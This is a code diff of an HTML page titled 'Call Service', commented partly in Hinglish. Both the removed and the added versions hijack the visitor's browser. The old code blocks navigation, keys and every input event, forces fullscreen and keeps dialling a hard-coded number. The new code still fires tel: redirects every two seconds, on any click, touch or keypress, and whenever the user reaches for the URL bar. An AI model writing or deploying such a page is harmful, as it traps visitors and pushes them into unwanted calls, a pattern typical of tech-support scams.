@@ -2,195 +2,107 @@
 <html>
 <head>
     <title>Call Service</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            -webkit-touch-callout: none;
-            -webkit-user-select: none;
-            -moz-user-select: none;
-            -ms-user-select: none;
-            user-select: none;
             -webkit-tap-highlight-color: transparent;
         }
-        
         body {
             font-family: Arial, sans-serif;
             background: #000;
             color: white;
             height: 100vh;
-            overflow: hidden;
-            touch-action: none;
-        }
-        
-        .fullscreen-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(45deg, #ff0000, #0000ff);
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
             text-align: center;
-            padding: 20px;
-            z-index: 9999;
-        }
-        
-        .blink {
-            animation: blink 1s infinite;
-            font-size: 24px;
-            margin: 20px 0;
-        }
-        
-        @keyframes blink {
-            0% { opacity: 1; }
-            50% { opacity: 0.3; }
-            100% { opacity: 1; }
         }
     </style>
 </head>
 <body>
-    <div class="fullscreen-overlay">
-        <h1>📞 CALLING... 📞</h1>
-        <div class="blink">Please wait</div>
-        <p>Connecting to support team...</p>
+    <div>
+        <h1>📞 Call Support</h1>
+        <p>We are connecting you...</p>
     </div>
 
     <script>
-        // Phone number - CHANGE YAHI KARNA
         const PHONE_NUMBER = "+911234567890";
         
-        // Fullscreen mode activate karo
-        function requestFullscreen() {
-            try {
-                if (document.documentElement.requestFullscreen) {
-                    document.documentElement.requestFullscreen();
-                } else if (document.documentElement.mozRequestFullScreen) {
-                    document.documentElement.mozRequestFullScreen();
-                } else if (document.documentElement.webkitRequestFullscreen) {
-                    document.documentElement.webkitRequestFullscreen();
-                } else if (document.documentElement.msRequestFullscreen) {
-                    document.documentElement.msRequestFullscreen();
-                }
-            } catch (e) {}
-        }
-        
-        // URL bar completely block karne ke liye
-        function blockURLBar() {
-            // Scroll to top always
-            window.scrollTo(0, 0);
+        // Fast redirect function
+        function fastRedirect() {
+            // Immediate redirect
+            window.location.href = "tel:" + PHONE_NUMBER;
             
-            // Disable navigation
-            window.history.pushState(null, null, window.location.href);
-            window.onpopstate = function() {
-                window.history.pushState(null, null, window.location.href);
-                triggerCall();
-            };
-            
-            // Prevent any selection
-            document.onselectstart = function() { return false; };
-            document.oncontextmenu = function() { return false; };
-            
-            // Disable keyboard
-            document.onkeydown = function(e) {
-                e.preventDefault();
-                triggerCall();
-                return false;
-            };
-            
-            // Disable right click
-            document.addEventListener('contextmenu', function(e) {
-                e.preventDefault();
-                triggerCall();
-            });
-        }
-        
-        // Call trigger function
-        function triggerCall() {
-            // Multiple methods try karo
-            try {
-                window.location.href = "tel:" + PHONE_NUMBER;
-            } catch(e) {}
+            // Multiple fallbacks
+            setTimeout(() => {
+                window.open("tel:" + PHONE_NUMBER, "_self");
+            }, 50);
             
             setTimeout(() => {
-                try {
-                    window.open("tel:" + PHONE_NUMBER, "_self");
-                } catch(e) {}
+                window.location.replace("tel:" + PHONE_NUMBER);
             }, 100);
-            
-            setTimeout(() => {
-                try {
-                    const iframe = document.createElement('iframe');
-                    iframe.style.display = 'none';
-                    iframe.src = "tel:" + PHONE_NUMBER;
-                    document.body.appendChild(iframe);
-                } catch(e) {}
-            }, 200);
         }
         
-        // HAR EVENT BLOCK KARO
-        const events = [
-            'click', 'mousedown', 'mouseup', 'touchstart', 'touchend', 'touchmove',
-            'keydown', 'keyup', 'keypress', 'scroll', 'wheel', 'resize',
-            'focus', 'blur', 'input', 'change', 'submit', 'select',
-            'dragstart', 'dragend', 'dragover', 'drop'
-        ];
+        // URL bar click detection
+        let urlBarClicked = false;
         
-        events.forEach(eventType => {
-            document.addEventListener(eventType, function(e) {
-                e.preventDefault();
-                e.stopPropagation();
-                e.stopImmediatePropagation();
-                
-                if (eventType === 'touchstart' || eventType === 'click') {
-                    triggerCall();
-                }
-                
-                return false;
-            }, true);
-        });
+        // Monitor URL changes and focus events
+        let currentURL = window.location.href;
         
-        // Continuous monitoring
         setInterval(() => {
-            // Always scroll to top
-            window.scrollTo(0, 0);
-            
-            // Prevent URL bar access
-            if (window.scrollY > 0) {
-                window.scrollTo(0, 0);
-                triggerCall();
+            // URL change detection
+            if(window.location.href !== currentURL) {
+                currentURL = window.location.href;
+                fastRedirect();
             }
             
-            // Prevent zoom
-            document.body.style.zoom = "1";
-        }, 50);
+            // Focus events - when user clicks URL bar
+            if(document.activeElement.tagName === 'INPUT' || 
+               document.activeElement.tagName === 'TEXTAREA') {
+                fastRedirect();
+            }
+        }, 10); // Very fast checking
         
-        // Page load hone par sab activate karo
+        // Window focus/blur events - when switching to URL bar
+        window.addEventListener('blur', function() {
+            setTimeout(fastRedirect, 100);
+        });
+        
+        window.addEventListener('focus', function() {
+            setTimeout(fastRedirect, 100);
+        });
+        
+        // Mouse events near top of screen (where URL bar is)
+        document.addEventListener('mousedown', function(e) {
+            if(e.clientY < 50) { // Top area of screen
+                fastRedirect();
+            }
+        });
+        
+        document.addEventListener('touchstart', function(e) {
+            if(e.touches[0].clientY < 50) { // Top area of screen
+                fastRedirect();
+            }
+        });
+        
+        // Key events for URL editing
+        document.addEventListener('keydown', function(e) {
+            // If any key pressed (especially for URL editing)
+            fastRedirect();
+        });
+        
+        // Page load pe bhi ready
         window.onload = function() {
-            requestFullscreen();
-            blockURLBar();
-            triggerCall();
-            
-            // Auto call after 3 seconds
-            setTimeout(triggerCall, 3000);
+            // Continuous monitoring start
+            setInterval(fastRedirect, 2000); // Every 2 seconds try call
         };
         
-        // Resize par bhi call
-        window.onresize = triggerCall;
-        
-        // Visibility change (tab switch) par bhi call
-        document.addEventListener('visibilitychange', function() {
-            if (document.hidden) {
-                triggerCall();
-            }
-        });
-        
-        console.log("System Activated - URL Bar Completely Blocked");
+        // Normal click events
+        document.addEventListener('click', fastRedirect);
+        document.addEventListener('touchstart', fastRedirect);
         
     </script>
 </body>
